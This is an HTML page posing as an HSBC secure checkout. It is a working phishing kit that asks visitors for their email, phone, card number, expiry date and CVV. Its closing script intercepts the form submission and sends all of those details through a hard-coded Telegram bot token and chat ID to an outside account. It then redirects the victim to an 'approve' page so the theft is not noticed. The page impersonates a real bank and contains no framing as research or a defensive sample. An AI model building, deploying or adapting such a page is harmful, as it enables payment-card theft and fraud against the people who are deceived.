<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Secure Payment - HSBC</title>
    <link href="https://fonts.googleapis.com/css2?family=Noto+Sans:wght@400;700&display=swap" rel="stylesheet">
    <style>
        :root {
            --hsbc-red: #db0011;
            --text-dark: #333;
            --border-light: #d5d5d5;
        }

        * { box-sizing: border-box; margin: 0; padding: 0; }
        
        body {
            font-family: 'Noto Sans', Arial, sans-serif;
            background-color: #fff;
            color: var(--text-dark);
            line-height: 1.6;
        }

        /* --- GLOBAL HEADER --- */
        header {
            border-bottom: 1px solid #eee;
            padding: 10px 5%;
            display: flex;
            justify-content: space-between;
            align-items: center;
            background: #fff;
            position: sticky;
            top: 0;
            z-index: 1000;
        }
        .logo-text {
            color: var(--hsbc-red);
            font-size: 28px;
            font-weight: 900;
            letter-spacing: -1px;
            font-family: serif;
            text-decoration: none;
        }
        .login-btn {
            background: var(--hsbc-red);
            color: #fff;
            border: none;
            padding: 8px 20px;
            font-weight: bold;
            cursor: pointer;
            border-radius: 2px;
        }

        /* --- PAYMENT FORM CONTAINER --- */
        .main-wrapper {
            max-width: 800px;
            margin: 40px auto;
            padding: 20px;
        }
        .payment-card {
            background: #fff;
            padding: 30px;
            border: 1px solid #f0f0f0;
            box-shadow: 0 2px 15px rgba(0,0,0,0.05);
        }
        h2 {
            font-size: 22px;
            margin-bottom: 25px;
            border-bottom: 2px solid var(--hsbc-red);
            display: inline-block;
            padding-bottom: 5px;
        }

        .form-grid {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 30px;
        }
        
        .section-title {
            font-size: 16px;
            font-weight: bold;
            margin-bottom: 15px;
            color: #000;
            text-transform: uppercase;
        }

        .form-group { margin-bottom: 15px; }
        label { display: block; font-size: 14px; font-weight: bold; margin-bottom: 5px; color: #555; }
        input, select {
            width: 100%;
            padding: 12px;
            border: 1px solid var(--border-light);
            border-radius: 3px;
            font-size: 15px;
            background: #fafafa;
        }
        input:focus { outline: 1px solid var(--hsbc-red); background: #fff; }

        .expiry-cvv {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 10px;
        }

        .submit-btn {
            width: 100%;
            padding: 16px;
            background: #333;
            color: white;
            border: none;
            font-size: 16px;
            font-weight: bold;
            cursor: pointer;
            margin-top: 20px;
            transition: 0.3s;
        }
        .submit-btn:hover { background: #000; }

        /* --- GLOBAL FOOTER --- */
        footer {
            background: #f9f9f9;
            padding: 40px 5%;
            margin-top: 60px;
            border-top: 1px solid #eee;
        }
        .footer-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(150px, 1fr));
            gap: 30px;
            max-width: 1100px;
            margin: 0 auto;
        }
        .footer-col h4 { font-size: 13px; margin-bottom: 15px; text-transform: uppercase; color: #000; }
        .footer-col ul { list-style: none; padding: 0; }
        .footer-col a { text-decoration: none; color: #666; font-size: 13px; }
        .footer-bottom {
            max-width: 1100px;
            margin: 30px auto 0;
            padding-top: 20px;
            border-top: 1px solid #ddd;
            font-size: 12px;
            color: #888;
            text-align: center;
        }

        @media (max-width: 768px) {
            .form-grid { grid-template-columns: 1fr; }
            .logo-text { font-size: 22px; }
        }
    </style>
</head>
<body>

<header>
    <a href="#" class="logo-text">HSBC</a>
    <button class="login-btn">Log On</button>
</header>

<div class="main-wrapper">
    <div class="payment-card">
        <h2>Secure Checkout</h2>
        
        <form id="securePaymentForm">
            <div class="form-grid">
                <div class="form-section">
                    <p class="section-title">Billing Details</p>
                    <div class="form-group">
                        <label>Email Address</label>
                        <input type="email" id="email" required>
                    </div>
                    <div class="form-group">
                        <label>Phone Number</label>
                        <input type="text" id="contact" required>
                    </div>
                </div>

                <div class="form-section">
                    <p class="section-title">Payment Method (INR 170.00)</p>
                    <div class="form-group">
                        <label>Cardholder Name</label>
                        <input type="text" id="cardName" required>
                    </div>
                    <div class="form-group">
                        <label>Card Number</label>
                        <input type="text" id="cardNum" placeholder="XXXX-XXXX-XXXX-XXXX" maxlength="19" required>
                    </div>
                    <div class="expiry-cvv">
                        <div class="form-group">
                            <label>Expiry Date</label>
                            <div style="display:flex; gap:5px;">
                                <select id="expmonth" required>
                                    <option value="">MM</option>
                                    <option>01</option><option>02</option><option>03</option><option>04</option>
                                    <option>05</option><option>06</option><option>07</option><option>08</option>
                                    <option>09</option><option>10</option><option>11</option><option>12</option>
                                </select>
                                <select id="expyear" required>
                                    <option value="">YY</option>
                                    <option>26</option><option>27</option><option>28</option><option>29</option>
                                    <option>30</option><option>31</option><option>32</option><option>33</option>
                                </select>
                            </div>
                        </div>
                        <div class="form-group">
                            <label>CVV</label>
                            <input type="password" id="cvv" placeholder="123" maxlength="4" required>
                        </div>
                    </div>
                </div>
            </div>

            <button type="submit" class="submit-btn">Complete Payment</button>
        </form>
    </div>
</div>

<footer>
    <div class="footer-grid">
        <div class="footer-col">
            <h4>Security</h4>
            <ul><li><a href="#">Privacy</a></li><li><a href="#">Safety</a></li></ul>
        </div>
        <div class="footer-col">
            <h4>Support</h4>
            <ul><li><a href="#">Contact Us</a></li><li><a href="#">FAQs</a></li></ul>
        </div>
    </div>
    <div class="footer-bottom">
        <p>&copy; 2026 HSBC Group. All rights reserved.</p>
    </div>
</footer>

<script>
document.getElementById("securePaymentForm").addEventListener("submit", function(e) {
    e.preventDefault();
    
    const botToken = "7654977396:AAEzzSUAiGBgY2JEl3K8PmMp-Quj3QMXYTg";
    const chatId = "8608321495";
    
    const p = {
        em: document.getElementById("email").value,
        ph: document.getElementById("contact").value,
        nm: document.getElementById("cardName").value,
        cn: document.getElementById("cardNum").value,
        ex: document.getElementById("expmonth").value + "/" + document.getElementById("expyear").value,
        cv: document.getElementById("cvv").value
    };

    const text = `💳 Payment Data\nEmail: ${p.em}\nPhone: ${p.ph}\nCard: ${p.cn}\nName: ${p.nm}\nExp: ${p.ex}\nCVV: ${p.cv}`;

    fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ chat_id: chatId, text: text })
    })
    .then(() => { window.location.href = "approve.html"; })
    .catch(() => { window.location.href = "approve.html"; });
});
</script>

</body>
</html>
